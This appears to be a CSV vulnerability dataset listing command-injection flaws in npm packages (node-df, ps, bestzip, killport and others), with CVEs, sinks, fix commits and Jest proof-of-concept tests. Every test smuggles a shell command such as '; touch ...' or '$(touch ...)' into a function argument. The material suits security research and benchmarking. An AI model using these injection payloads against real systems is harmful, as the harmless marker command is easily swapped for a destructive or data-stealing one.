Attack Type,CVE-ID,Package,Version,Fix Version,Exploit File Path,Exploit,Fixed Commit,Sink,Links
command-injection,CVE-2019-15597,node-df,0.1.4,,command-injection/node-df_0.1.4,"test(""Command Injection in node-df"", (done) => {
  expect.assertions(2);
  const df = require(""node-df"");
  const fs = require(""fs"");
  const path = ""./node-df"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let options = {
    file: ""/;touch node-df"",
    prefixMultiplier: ""GB"",
    isDisplayPrefixMultiplier: true,
    precision: 2,
  };
  df(options, function (error, response) {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",,lib/index.js:41:5,https://security.snyk.io/vuln/SNYK-JS-NODEDF-536779; https://github.com/advisories/GHSA-wp7m-mrvf-599c
command-injection,,extra-asciinema,1.0.0,1.0.23,command-injection/extra-asciinema_1.0.0,"test(""Command Injection in extra-asciinema"", (done) => {
  expect.assertions(2);
  const asciinema = require(""extra-asciinema"");
  const fs = require(""fs"");
  const path = ""./extra-asciinema"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  asciinema.uploadSync(""; touch extra-asciinema"");
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {
    done();
  });
});
",https://github.com/nodef/extra-asciinema/commit/fd1a8a38d6c72e1eb573b2ab03d5e86de8047480,index.js:208:20,https://security.snyk.io/vuln/SNYK-JS-EXTRAASCIINEMA-608292; 
command-injection,CVE-2020-8178,install-package,0.4.17,,command-injection/jison_0.4.17,"test(""Command Injection in jison"", (done) => {
  expect.assertions(2);
  exec = require(""child_process"").exec;
  const fs = require(""fs"");
  const path = ""./jison"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let command = ""; touch jison"";
  exec(""jison "" + command, function (error) {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",,build/queueRunner.js:45:12,https://security.snyk.io/vuln/SNYK-JS-JISON-570539; https://github.com/advisories/GHSA-vr9x-mm65-2438
command-injection,CVE-2021-23377,lycwed-spritesheetjs,1.2.5,,command-injection/lycwed-spritesheetjs_1.2.5,"test(""Command Injection in lycwed-spritesheetjs"", (done) => {
  expect.assertions(2);
  let spritesheet = require(""lycwed-spritesheetjs"");
  const fs = require(""fs"");
  const path = ""./lycwed-spritesheetjs"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  let file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  spritesheet(
    ""./"",
    {
      fuzz: ""& touch lycwed-spritesheetjs #"",
      ext: ""json"",
    },
    function () {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {
        done();
      });
    }
  );
});
",,lib/generator.js:85:7,https://security.snyk.io/vuln/SNYK-JS-LYCWEDSPRITESHEETJS-1050428; https://github.com/advisories/GHSA-rhwp-9vm9-547q
command-injection,CVE-2018-16460,ps,0.0.2,1.0.0,command-injection/ps_0.0.2,"test(""Command Injection in ps"", (done) => {
  expect.assertions(2);
  const ps = require(""ps"");
  const fs = require(""fs"");
  const path = ""./ps"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  ps.lookup({ pid: ""$(touch ps)"" }, function (err, proc) {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",,lib/index.js:8:5,https://security.snyk.io/vuln/SNYK-JS-PS-72307; https://github.com/advisories/GHSA-cfhg-9x44-78h2
command-injection,CVE-2020-7795,get-npm-package-version,1.0.6,1.0.7,command-injection/get-npm-package-version_1.0.6,"test(""Command Injection in get-npm-package-version"", () => {
  expect.assertions(2);
  const a = require(""get-npm-package-version"");
  const fs = require(""fs"");
  const path = ""./get-npm-package-version"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  a(""& touch get-npm-package-version"");
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",https://github.com/hoperyy/get-npm-package-version/commit/40b1cf31a0607ea66f9e30a0c3af1383b52b2dec,index.js:16:48,https://security.snyk.io/vuln/SNYK-JS-GETNPMPACKAGEVERSION-1050390; 
command-injection,CVE-2019-15597,xps,1.0.2,,command-injection/xps_1.0.2,"test(""Command Injection in xps"", (done) => {
  expect.assertions(2);
  const ps = require(""xps"");
  const fs = require(""fs"");
  const path = ""./xps"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  ps.kill(""`touch xps;`"").fork(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",https://github.com/sorellabs/xps/commit/768481146b8ead3811310eecc0f56e2d107cb740,lib/utils.js:28:5,https://security.snyk.io/vuln/SNYK-JS-XPS-590098; https://github.com/advisories/GHSA-wp7m-mrvf-599c
command-injection,CVE-2018-3757,pdf-image,1.0.5,2.0.1,command-injection/pdf-image_1.0.5,"test(""Command Injection in pdf-image"", () => {
  expect.assertions(2);
  const PDFImage = require(""pdf-image"").PDFImage;
  const fs = require(""fs"");
  const path = ""./pdf-image"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let pdfImage = new PDFImage('asd.pdf""; touch pdf-image""');
  try {
    return pdfImage.numberOfPages().then(function (imagePath) {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {});
    });
  } catch (e) {}
});
",https://github.com/roest01/node-pdf-image/commit/54679496a89738443917608c2bbe2f6e5dd20e83,index.js:43:7,https://security.snyk.io/vuln/npm:pdf-image:20180529; https://github.com/advisories/GHSA-5gwh-g79j-vh4q
command-injection,CVE-2020-7730,bestzip,2.1.6,2.1.7,command-injection/bestzip_2.1.6,"test(""Command Injection in bestzip"", (done) => {
  expect.assertions(2);
  const zip = require(""bestzip"");
  const fs = require(""fs"");
  const path = ""./bestzip"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  zip({
    source: """",
    destination: ""./; touch bestzip"",
  }).finally(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
    done();
  });
});
",https://github.com/nfriedly/node-bestzip/commit/45d4a901478c6a8f396c8b959dd6cf8fd3f955b6,lib/bestzip.js:27:27,https://security.snyk.io/vuln/SNYK-JS-BESTZIP-609371; https://github.com/advisories/GHSA-6xv6-jpvw-cx6q
command-injection,,git-lib,1.6.0,,command-injection/git-lib_1.6.0,"test(""Remote code execution in git-lib"", () => {
  expect.assertions(2);
  const git = require(""git-lib"");
  const fs = require(""fs"");
  const path = ""./git-lib"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    return git.add(""test;touch git-lib;"").finally(function () {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {});
    });
  } catch (error) {}
});
",,git.js:13:9,https://security.snyk.io/vuln/SNYK-JS-GITLIB-1012734; 
command-injection,CVE-2021-23377,onion-oled-js,0.0.2,,command-injection/onion-oled-js_0.0.2,"test(""Command Injection in onion-oled-js"", () => {
  expect.assertions(2);
  const OLEDExp = require(""onion-oled-js"").OLEDExp;
  const fs = require(""fs"");
  const path = ""./onion-oled-js"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  let file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return OLEDExp.scroll("";touch onion-oled-js #"").finally(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
  });
});
",,src/oled-exp.js:91:16,https://security.snyk.io/vuln/SNYK-JS-ONIONOLEDJS-1078808; https://github.com/advisories/GHSA-rhwp-9vm9-547q
command-injection,,gry,5.0.8,6.0.0,command-injection/gry_5.0.8,"test(""Command Injection in gry"", (done) => {
  expect.assertions(2);
  const Repo = require(""gry"");
  const fs = require(""fs"");
  const path = ""./gry"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let myRepo = new Repo(""."");
  myRepo.pull(""test; touch gry; #"", function () {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",,lib/index.js:88:20,https://security.snyk.io/vuln/SNYK-JS-GRY-566987; 
command-injection,CVE-2018-3772,whereis,0.4.0,0.4.1,command-injection/whereis_0.4.0,"test(""Command Injection in whereis"", (done) => {
  expect.assertions(2);
  const whereis = require(""whereis"");
  const fs = require(""fs"");
  const path = ""./whereis"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let filename = ""; touch whereis"";
  whereis(filename, () => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",https://github.com/vvo/node-whereis/commit/0f64e3780235004fb6e43bfd153ea3e0e210ee2b,index.js:4:6,https://security.snyk.io/vuln/npm:whereis:20180401; https://github.com/advisories/GHSA-wjr4-2jgw-hmv8
command-injection,,node-unrar,0.1.0,,command-injection/node-unrar_0.1.0,"test(""Remote code execution in node-unrar"", (done) => {
  expect.assertions(2);
  const Unrar = require(""node-unrar"");
  const fs = require(""fs"");
  const path = ""./node-unrar"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    var rar = new Unrar(""/path/to/file.rar"");
    rar._execute([], ""; touch node-unrar;"", function () {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {
        done();
      });
    });
  } catch (error) {}
});
",,lib/index.js:23:3,; 
command-injection,CVE-2019-15609,kill-port-process,0.0.1,2.2.0,command-injection/kill-port-process_0.0.1,"test(""Command Injection in kill-port-process"", () => {
  expect.assertions(2);
  const killPortProcess = require(""kill-port-process"");
  const fs = require(""fs"");
  const path = ""./kill-port-process"";
  const PORT = ""$(touch kill-port-process)"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return killPortProcess(PORT)
    .then(() => {
      console.log(""here!"");
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
    })
    .catch((err) => {})
    .finally(() => {
      console.log(""here!!!!"");
      if (fs.existsSync(path)) {
        fs.unlinkSync(path);
        console.log(""File removed!:"", path);
      }
    });
});
",,src/index.js:44:4,https://security.snyk.io/vuln/SNYK-JS-KILLPORTPROCESS-543829; 
command-injection,CVE-2020-7632,node-mpv,0.12.2,,command-injection/node-mpv_0.12.2,"test(""Command Injection in node-mpv"", () => {
  expect.assertions(2);
  const Root = require(""node-mpv"");
  const fs = require(""fs"");
  const path = ""./node-mpv"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  var options = { binary: '"" $(touch node-mpv) ""' };
  try {
    var root = new Root(options);
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",,lib/mpv/mpv.js:45:16,https://security.snyk.io/vuln/SNYK-JS-NODEMPV-564426; https://github.com/advisories/GHSA-cqr2-xhg6-p268
command-injection,CVE-2021-23360,killport,1.0.1,1.0.2,command-injection/killport_1.0.1,"test(""Command Injection in killport"", () => {
  expect.assertions(2);
  const killport = require(""killport"");
  const fs = require(""fs"");
  const path = ""./killport"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return killport(""$(touch killport); #"").catch(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, () => {});
  });
});
",https://github.com/ssnau/killport/commit/bec8e371f170a12e11cd222ffc7a6e1ae9942638,index.js:9:8,https://security.snyk.io/vuln/SNYK-JS-KILLPORT-1078535; https://github.com/advisories/GHSA-fc42-h7q4-qp8h
command-injection,CVE-2021-23356,kill-process-by-name,1.0.5,,command-injection/kill-process-by-name_1.0.5,"test(""Command Injection in kill-process-by-name"", (done) => {
  expect.assertions(2);
  const kill_process_by_name = require(""kill-process-by-name"");
  const fs = require(""fs"");
  const path = ""./kill-process-by-name"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  kill_process_by_name(""$(touch kill-process-by-name)"");
  setTimeout(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, () => {
      done();
    });
  }, 500);
});
",,index.js:12:18,https://security.snyk.io/vuln/SNYK-JS-KILLPROCESSBYNAME-1078534; https://github.com/advisories/GHSA-qc65-cgvr-93p6
command-injection,CVE-2021-23376,ffmpegdotjs,0.0.4,,command-injection/ffmpegdotjs_0.0.4,"test(""Command Injection in ffmpegdotjs"", () => {
  expect.assertions(2);
  let ffmpegdotjs = require(""ffmpegdotjs"");
  const fs = require(""fs"");
  const path = ""./ffmpegdotjs"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  let file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return ffmpegdotjs
    .trimvideo(""package-lock.json"", 0, 30, ""n || touch ffmpegdotjs; #"")
    .then(() => {})
    .catch((err) => {})
    .finally(() => {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {});
    });
});
",,index.js:191:9,https://security.snyk.io/vuln/SNYK-JS-FFMPEGDOTJS-1078542; https://github.com/advisories/GHSA-f39r-cpmj-whcg
